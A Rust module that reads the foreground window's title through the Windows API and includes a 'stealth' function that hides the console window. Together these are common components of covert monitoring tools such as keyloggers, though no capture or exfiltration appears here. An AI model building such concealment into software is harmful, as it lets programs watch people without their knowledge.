pub mod title {
    pub fn get_window_name() -> String {
        window_title()
    }
    fn window_title() -> String {
        let mut v: Vec<i8> = Vec::with_capacity(255);
        let mut _window_title = move || unsafe {
            let read_len = winapi::um::winuser::GetWindowTextA(
                winapi::um::winuser::GetForegroundWindow(),
                v.as_mut_ptr(),
                v.capacity().try_into().unwrap(),
            );
            // Resize vector to exactly length of our final string.
            v.set_len(read_len.try_into().unwrap());
            // This confusing thing converts the i8s into u8's to be read into a string.
            let byte_slice = std::slice::from_raw_parts(v.as_ptr() as *const u8, v.len());
            String::from_utf8_lossy(byte_slice)
        };
        String::from(_window_title())
    }
    // Not written by me - hides the console window
#[allow(temporary_cstring_as_ptr)]
#[allow(unused)]
    pub fn stealth() {
        let mut stealth: winapi::shared::windef::HWND;
        unsafe {
            winapi::um::consoleapi::AllocConsole();
            stealth = winapi::um::winuser::FindWindowA(
                std::ffi::CString::new("ConsoleWindowClass")
                    .unwrap()
                    .as_ptr(),
                std::ptr::null(),
            );
            winapi::um::winuser::ShowWindow(stealth, 0);
        }
    }
}